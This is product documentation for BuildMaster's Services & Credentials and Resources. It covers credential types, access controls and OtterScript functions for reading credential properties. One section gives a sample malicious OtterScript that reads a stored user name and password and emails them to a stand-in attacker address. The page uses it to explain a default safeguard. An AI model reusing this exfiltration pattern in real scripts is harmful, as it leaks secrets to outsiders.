---
title: "Credentials & Resources"
order: 2
---

When you select Git Repository as the source when creating a new application, you're prompted to connect to a Git server such as GitHub or GitLab and select a repository:
![git-connect-to-service](/resources/docs/git-connect-to-service.png){height="" width="50%"}

A similar dialog box appears when you select CI servers as a source (Jenkins, TeamCity, etc.) or when you add or edit a connection on the Settings page under your application.

These connections - and others like ProGet, AWS, etc. - are managed with two tightly integrated functions called Services & Credentials and Resources. Under Administration, you can see the connections you've already added, edit them, and more:

:::(Internal) (Private notes)
<< show screenshot of listing page>>
:::

This article explains what these components are and how to use them.


## What are Services & Credentials?
Services & Credentials store accounts, logins and access keys that provide access to services such as GitHub, GitLab, Bitbucket, Jenkins, ProGet, etc. Several types are available.

### Generic Credential Types
The three general credential types are not associated with any particular service, but can be used by a resource, in your scripts, or by another component of BuildMaster.

* **Private Key** is mainly used by the SSH-based agent when key-based authentication is required.
* **User Name & Password** contains a user name (visible) and password (secret) and is used to represent a general account, such as a Windows domain account.
* **API Key/Token** contains only a token property (which is secret) and is used by a variety of resources

For example, a Subversion Repository resource uses a User name & Password credential. You can also use User name & Password credentials in OtterScript.

### Service Account Types
Depending on what [extensions](/docs/buildmaster/reference/extensions) you have installed, you will see different options available. Common ones will include:
* **ProGet Server**; Connect to an instance of ProGet to access feeds, packages, and other services.
* **AWS**; Credentials that represent an access key ID and a secret key.
* **Azure DevOps Account**; Use an Azure DevOps account to connect to Azure DevOps resources
* **Bitbucket Account**; Use a Bitbucket account to connect to Bitbucket resources.
* **GitHub Account**; Use an account on GitHub to connect to GitHub resources
* **GitLab Account**; Use an account on GitLab to connect to GitLab resources
* **Jenkins Server**; Connect to a Jenkins instance to import artifacts and trigger builds.
* **TeamCity Server**; Login credentials for TeamCity.
* **Azure Service Principal**: Use an Azure service principal to deploy Azure Web Apps.

Under the hood, Services & Credentials are called `SecureCredentials`, so you may see references to secure credentials in various places or error messages.

## What are Resources?
Resources refer to a specific resource in a service, e.g., a Git repository, a CI Project, Feed, etc. Under the hood, Resources are called `SecureResource`, so you may see references to secure resources in various places or error messages.

### Git Repositories & CI Projects
In general, we don't recommend adding Git repositories or CI projects to the Administration pages, as the fields have no validation and aren't very intuitive. Instead, you should link them to individual applications or use variables and operations in your OtterScript.

See the following documentation to learn more:
* [Git & Source Control](/docs/buildmaster/builds-continuous-integration/buildmaster-git-source-control)
* [Importing Builds (Jenkins, TeamCity, etc.)](/docs/buildmaster/deployment-continuous-delivery/buildmaster-ciserver-import)

### Other Resource Types
Depending on what [extensions](/docs/buildmaster/reference/extensions) you have installed, different options will be available. Common ones will include:

* **Docker Container Registry**; Interact with containers in a private container registry.
* **Inedo BuildMaster**; Connect to an instance of BuildMaster to sync infrastructure, create builds/releases, and perform other API-based operations.
* **Inedo Otter**; Connect to an instance of Otter to sync infrastructure, detect configuration drift, trigger jobs, and perform other API-based operations.
* **NuGet Package Feed**; Interact with packages in a NuGet feed.
* **Subversion Repository**; Connect to an SVN repository for source control integration.

## Managing Services & Credentials
You manage Services & Credentials at Application Settings > Credentials or Administration > Secure Credentials. 

All secure credentials have the following properties:

* **Name** - a name of up to 50 characters, used as a credential reference; you can change the name later, but any operations or components that relied on it will not be able to find it then
* **Application** - specifies whether the secure credential is an application-level credential or a global (shared) credential
* **Environment** - optional; restricts in which environments the credential can be used and which users have access to it
* **OtterScript Usage** - optional; you can allow the `$CredentialProperty` variable function to extract secure properties
* **Environment Restriction** - optional; if this option is set, a runtime error will occur if this credential is used in a deployment plan that is not running in the same environment

Depending on the type of secure credential, there are other fields such as user name
 or password that you can edit.


:::(Internal) (Private notes)
<< show screenshot of edit  page>>
:::

Secret fields (like the password) are displayed as an empty text field, and entering a value in the text field changes it. You can click the Show Secret Fields button to display these values if you have the appropriate permissions.

## Managing Resources
You manage Services & Credentials at Application Settings > Credentials or Administration > Secure Credentials.

All secure credentials have the following properties:

* **Name** - a name of up to 50 characters that is used to refer to the credential resource; you can change the name later, but any operation or component that relied on this name will no longer be able to find it
* **Application** - specifies whether the secure credential is an application-level credential or a global (shared) credential
* **Credentials** - associates the resource with a credential/service account

Depending on the type of resource, there are other fields such as Name or Repository that you can edit.

## Using Credentials and Resources

Most Operations that work with resources and/or credentials let you use a secure resource name and/or a secure credential name. 

For example, although the `Git::Checkout-Code` operation has all the properties required to connect to a Git repository, you can simply specify a configured secure resource name instead.

````
Git::Checkout-Code
(
    From: MyAzureDevOpsResource
);
````

At runtime, the operation will search for a secure resource named `MyAzureDevOpsResource`. If a secure credential is configured for this secure resource, the associated secure credential is also used.

If the credential has "restricted to environment use" configured, this is only allowed if the deployment plan is running in the same environment. This can be frustrating and unintuitive for your users, so be careful when using it.

## Limiting Secure Credential Access

You may want to allow or restrict certain users from accessing certain secure credentials, for example, to allow developers to manage credentials in the integration and test environment. This is done by associating the credentials with an environment and then creating the appropriate [access controls](/docs/buildmaster/configuring-for-your-team/buildmaster-administration-security) for that environment.

There are two task attributes that you can use to control this access:

* **Manage Credentials** allows you to view, delete, and edit credentials, but not view existing encrypted/sensitive fields
* **View Passwords** allows you to view encrypted/sensitive fields of a credential

On the Manage Credentials page, users only see the credentials they are allowed to manage, and can only create credentials in allowed environments.

## Accessing Properties from OtterScript

For most operations, you simply enter the name of a secure resource or credential and use the properties you have configured. However, there may be times when you need to access the configured properties, such as when you want to pass a user name or password to a script or command-line utility.

To access the properties of a configured Secure Credential or Secure Property from within OtterScript, you can use the [`$SecureCredentialProperty`](/docs/buildmaster/reference/functions/credentials/securecredentialproperty) and [`$SecureResourceProperty`](/docs/buildmaster/reference/functions/credentials/secureresourceproperty) functions.

````
set $host = $SecureCredentialProperty(InternalProGet, ServerUrl);

exec sometool.exe --host $host;
````

By default, accessing secret properties of a secure credential will raise an error. This is to prevent malicious OtterScript, like this:

````
# NOTE - this won't actually work unless you explicitly allow it
set $HDarsUser = $SecureCredentialProperty(HDarsUser, UserName);
set $HDarsPassword = $SecureCredentialProperty(HDarsUser, Password);

Send-Email
(
    To: hacker45@agam.ru,
    Subject: Username is $HdarsUser and password is $HdarsPassword
);
````

If you absolutely must access a secret field of a Secure Credential (such as a Password or API Token ), you must enable the use of variables for that credential. Here is a case where you may need to do this:

````
set $HDarsUser = $SecureCredentialProperty(HDarsUser, UserName);
set $HDarsPassword = $SecureCredentialProperty(HDarsUser, Password);
exec hdars-tool.exe --user $HdarsUser -- pass $HdarsPassword;
````

If you have important credentials, you should strongly consider writing a custom operation that can securely handle the credentials.
